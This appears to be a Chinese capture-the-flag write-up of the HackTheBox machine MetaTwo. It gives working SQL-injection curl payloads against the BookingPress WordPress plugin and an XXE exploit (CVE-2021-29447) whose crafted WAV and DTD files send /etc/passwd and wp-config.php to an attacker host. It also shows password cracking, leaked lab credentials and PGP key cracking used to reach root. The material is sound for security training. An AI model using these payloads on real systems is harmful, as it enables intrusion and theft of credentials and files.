![在这里插入图片描述](https://img-blog.csdnimg.cn/1be6911bf7db4f2892874ff5497433b5.png)

题目网址：
```
https://app.hackthebox.com/machines/MetaTwo
```
# 枚举
使用nmap枚举靶机

```
nmap -sC -sV -p- 10.10.11.186
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/1d60d3c21f8a4c1b91960ed9f09a5a53.png)

扫到了域名，我们本地dns解析一下
```
echo "10.10.11.186 metapress.htb" >> /etc/hosts
```

然后就是老三样，枚举网站根目录，子域名枚举，网站框架枚举
首先枚举网站根目录
```
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -t 100 -mc 200,302,301 -u http://metapress.htb/FUZZ
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/550a241259094c148b83cb5cc7653fa2.png)

只扫到了网站的后台和一大堆没什么用的东西，然后枚举子域名，并没有找到什么有用的东西

然后就是网站的框架枚举，我们要用到Wappalyzer这个模块
下载地址：
```
https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/?utm_source=addons.mozilla.org&utm_medium=referral&utm_content=search
```
安装好后去到网站页面，打开任务栏里的Wappalyzer模块

![在这里插入图片描述](https://img-blog.csdnimg.cn/0da5143ddb2947088ff9ee69d81e6b2f.png)

可以看到很多有用的信息，还可以用nuclei这个工具
```
apt install nuclei
nuclei -u http://metapress.htb/
```


![在这里插入图片描述](https://img-blog.csdnimg.cn/4716bf851aba4d8c905c37bf1a9d5027.png)

也能扫描到很多信息，现在我们知道这个网站的框架是WordPress，版本是5.6.2，我用searchsploitsearchsploit搜索了一下此版本的漏洞，需要登录后台才能用一个XXE的漏洞，既然是WordPress框架的，那就要用wpscan枚举一下
```
wpscan --url http://metapress.htb -e p,u --plugins-detection aggressive
```


![在这里插入图片描述](https://img-blog.csdnimg.cn/0f3bbfebca1f47f7890fe6087d8a61ff.png)

找到了robots文件

![在这里插入图片描述](https://img-blog.csdnimg.cn/e989721c087d42eda10d689952739a4f.png)
# CVE漏洞

![在这里插入图片描述](https://img-blog.csdnimg.cn/96350f29b0d942d083d7312917f93c51.png)

然后我一个一个点，发现只是网站的存在的根目录而已，然后我又在每个目录页面查看源代码看看有没有什么突破点，结果找到了一个

![在这里插入图片描述](https://img-blog.csdnimg.cn/d654f3a2abe6474091cb1226c5414a7c.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/264399a26a6845eab2f17ff013a22660.png)



![在这里插入图片描述](https://img-blog.csdnimg.cn/f9ac8ad1474e4b66864c6bcda7aee91b.png)

在这个页面发现了booking press框架，版本为1.0.10，通过搜索发现，这个框架版本有sql注入的漏洞
```
https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/41382fd8dddd486187871663e061ee72.png)
该插件在通过 bookingpress_front_get_category_services AJAX 操作用于动态构造的 SQL 查询之前无法正确清理用户提供的 POST 数据（可用于未经身份验证的用户），导致未经身份验证的 SQL 注入

然后根据这个网站的payload来测试

![在这里插入图片描述](https://img-blog.csdnimg.cn/5198670da14a423282db2d2c2fcb2149.png)

首先根据上面说的，我们要在刚刚的源代码页面搜索action:

![在这里插入图片描述](https://img-blog.csdnimg.cn/b8fe44be6ffc48d18b2d9537ba320fd7.png)

```
_wpnonce:'31bef7a194'
```

然后用以下payload测试

![在这里插入图片描述](https://img-blog.csdnimg.cn/f6e86cceddf147019ca88c08103d96d1.png)
```
curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=31bef7a194&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/9fe45cc5149f4dafb30044f7e969552a.png)

泄露了数据库名，数据库版本，系统信息等其他的东西，现在就是常规的sql注入测试了
```
curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=31bef7a194&category_id=33&total_service=-7502) UNION ALL SELECT group_concat(user_login),group_concat(user_pass),@@version_compile_os,1,2,3,4,5,6 from wp_users-- -'
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/3482698a01dd4199b81e3870830a3622.png)


获取了网站用户密码的hash值，现在爆破一下
```
admin $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.
manager $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/58cc786ab99449d5bc0ea264d69d3489.png)

```
john -w=/usr/share/wordlists/rockyou.txt hash
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/60c83821f498428bb50bc7bd2da161e2.png)


只爆破出了一个密码，我尝试登录ftp和ssh发现都不行，只能登录网站后台


![在这里插入图片描述](https://img-blog.csdnimg.cn/b704dc5b34b34881932065ab6eef6710.png)


![在这里插入图片描述](https://img-blog.csdnimg.cn/480555af2a4e421b9093223c6ec005a4.png)

通过前面对wordpress 5.6.2版本的漏洞搜索，发现了一个XXE的漏洞
```
https://www.acunetix.com/vulnerabilities/web/wordpress-5-6-x-multiple-vulnerabilities-5-6-5-6-2/
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/a664e3e41f5c46e588afe465fe9a9b62.png)
安全公司 SonarSource 的研究人员在 WordPress 媒体库中发现了一个 XML 外部实体注入 (XXE) 安全漏洞。仅当此 CMS 在 PHP 8 中运行 并且 攻击用户具有上传媒体文件的权限时，才能利用该漏洞
# 获取用户shell


利用过程参考这篇github
```
https://github.com/motikan2010/CVE-2021-29447
```
下载这些文件

![在这里插入图片描述](https://img-blog.csdnimg.cn/e60142d583a442a3b8d207382d04f9dd.png)


![在这里插入图片描述](https://img-blog.csdnimg.cn/3cfadbb1ccef4059a736d6c89aac0c5f.png)

根据文章操作

```
make up-wp
php -S 0.0.0.0:8001
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/5c83b8997c64457eb24fa524881f43e4.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/736be38d70ae41ab9d29212fd2645431.png)

然后修改此文件的ip地址

![在这里插入图片描述](https://img-blog.csdnimg.cn/daa48c7f458242fcb61ce38f1831d34e.png)

```
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.14.9:8001/dedsec.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
```
然后创建一个dedsec.dtd文件，里面是我们的恶意代码
```
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY % init "<!ENTITY &#37; trick SYSTEM 'http://10.10.14.9:8001/?p=%file;'>" >
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/ceb75433d0054bc39fbdfc9df8fc5d7c.png)



然后上传我们刚刚创建的payload.wav文件
```
http://metapress.htb/wp-admin/upload.php
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/7113a6963ad04d8d8e5214953ad2511d.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/d4e079337d404a698f3f1b4ba5b76391.png)



![在这里插入图片描述](https://img-blog.csdnimg.cn/33ab633fcfb2468c8e6170e7b30c6a87.png)

得到了一串base64编码，我们解密看看

![在这里插入图片描述](https://img-blog.csdnimg.cn/cd8d77ffc599442fad084e8d4f07d02a.png)

得到了靶机的/etc/passwd文件内容，现在我们获取一下网站配置，看看有没有有用的东西
```
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/var/www/metapress.htb/blog/wp-config.php">
<!ENTITY % init "<!ENTITY &#37; trick SYSTEM 'http://10.10.14.9:8001/?p=%file;'>" >
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/c13f6f68d49b4a02992ea3a920666e1f.png)

继续上传payload文件

![在这里插入图片描述](https://img-blog.csdnimg.cn/31577e7b48c4429d9a4566cb63c8ac6f.png)

继续解密，将此base64编码解密后的内容：
```
<?php
/** The name of the database for WordPress */
define( 'DB_NAME', 'blog' );

/** MySQL database username */
define( 'DB_USER', 'blog' );

/** MySQL database password */
define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

define( 'FS_METHOD', 'ftpext' );
define( 'FTP_USER', 'metapress.htb' );
define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
define( 'FTP_HOST', 'ftp.metapress.htb' );
define( 'FTP_BASE', 'blog/' );
define( 'FTP_SSL', false );

/**#@+
 * Authentication Unique Keys and Salts.
 * @since 2.6.0
 */
define( 'AUTH_KEY',         '?!Z$uGO*A6xOE5x,pweP4i*z;m`|.Z:X@)QRQFXkCRyl7}`rXVG=3 n>+3m?.B/:' );
define( 'SECURE_AUTH_KEY',  'x$i$)b0]b1cup;47`YVua/JHq%*8UA6g]0bwoEW:91EZ9h]rWlVq%IQ66pf{=]a%' );
define( 'LOGGED_IN_KEY',    'J+mxCaP4z<g.6P^t`ziv>dd}EEi%48%JnRq^2MjFiitn#&n+HXv]||E+F~C{qKXy' );
define( 'NONCE_KEY',        'SmeDr$$O0ji;^9]*`~GNe!pX@DvWb4m9Ed=Dd(.r-q{^z(F?)7mxNUg986tQO7O5' );
define( 'AUTH_SALT',        '[;TBgc/,M#)d5f[H*tg50ifT?Zv.5Wx=`l@v$-vH*<~:0]s}d<&M;.,x0z~R>3!D' );
define( 'SECURE_AUTH_SALT', '>`VAs6!G955dJs?$O4zm`.Q;amjW^uJrk_1-dI(SjROdW[S&~omiH^jVC?2-I?I.' );
define( 'LOGGED_IN_SALT',   '4[fS^3!=%?HIopMpkgYboy8-jl^i]Mw}Y d~N=&^JsI`M)FJTJEVI) N#NOidIf=' );
define( 'NONCE_SALT',       '.sU&CQ@IRlh O;5aslY+Fq8QWheSNxd6Ve#}w!Bq,h}V9jKSkTGsv%Y451F8L=bL' );

/**
 * WordPress Database Table prefix.
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';

```
我们找到了ftp用户的账号和密码
```
用户名：metapress.htb
密码：9NYS_ii@FyL_p5M2NvJ
```
然后我们登录ftp看看
```
ftp 10.10.11.186
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/effe4bf3b168419f9b41bc18e56993d7.png)

在mailer文件夹下，找到了一个有用的php文件，将他下载到本地
```
get send_email.php
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/5daf08a59d5543549c87a7a67e04fd20.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/916e0b06d4f946cea8c468a9842a8c32.png)
```
<?php
/*
 * This script will be used to send an email to all our users when ready for launch
*/

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';

$mail = new PHPMailer(true);

$mail->SMTPDebug = 3;                               
$mail->isSMTP();            

$mail->Host = "mail.metapress.htb";
$mail->SMTPAuth = true;                          
$mail->Username = "jnelson@metapress.htb";                 
$mail->Password = "Cb4_JmWM8zUZWMu@Ys";                           
$mail->SMTPSecure = "tls";                           
$mail->Port = 587;                                   

$mail->From = "jnelson@metapress.htb";
$mail->FromName = "James Nelson";

$mail->addAddress("info@metapress.htb");

$mail->isHTML(true);

$mail->Subject = "Startup";
$mail->Body = "<i>We just started our new blog metapress.htb!</i>";

try {
    $mail->send();
    echo "Message has been sent successfully";
} catch (Exception $e) {
    echo "Mailer Error: " . $mail->ErrorInfo;
}
```
找到了用户名和密码
```
用户名：jnelson
密码：Cb4_JmWM8zUZWMu@Ys
```
然后尝试登录ssh

```
ssh jnelson@10.10.11.186
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/e5e10cd78c704695a91c39ecf6e024c6.png)

成功获得用户权限
# 破解私钥提权
登录之后，我查看了当前文件夹下的所有文件，发现了passpie程序的文件夹，这个程序是用来管理密码的

![在这里插入图片描述](https://img-blog.csdnimg.cn/c6f238e91f6a46b9bfcb195589f9d2d7.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/6d42a828df7440f281273aa8d156aced.png)


进去找了一下，发现了一个pgp私钥文件，我们先将.keys文件下载到本地，其实kali本地创建一个文件，然后复制粘贴也可以
```
scp jnelson@10.10.11.186:.passpie/.keys .keys
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/883bdbc9981341bebd42aa364b782b70.png)

这个.keys里有两个密钥，一个公钥，一个私钥，我把公钥删了，不然等一下工具用不了，然后把文件改个名

![在这里插入图片描述](https://img-blog.csdnimg.cn/c01c43dc303b4edda8e71b8ad0c62c0b.png)


先用gpg2john将key文件转换为john可爆破的格式，然后用john爆破
```
gpg2john key > hash
john -w=/usr/share/wordlists/rockyou.txt hash
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/66a4938e3202433a879d55bc41484f9c.png)
```
passpie密码为：blink182
```


爆破出密码后回到靶机，查看passpie里存放的密码，输入密码得到root密码
```
passpie list
passpie export pass
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/f98ddfea773b45f5b153f828f4f7f6a7.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/cb67d86297d94e8c865828958d4b8d9b.png)

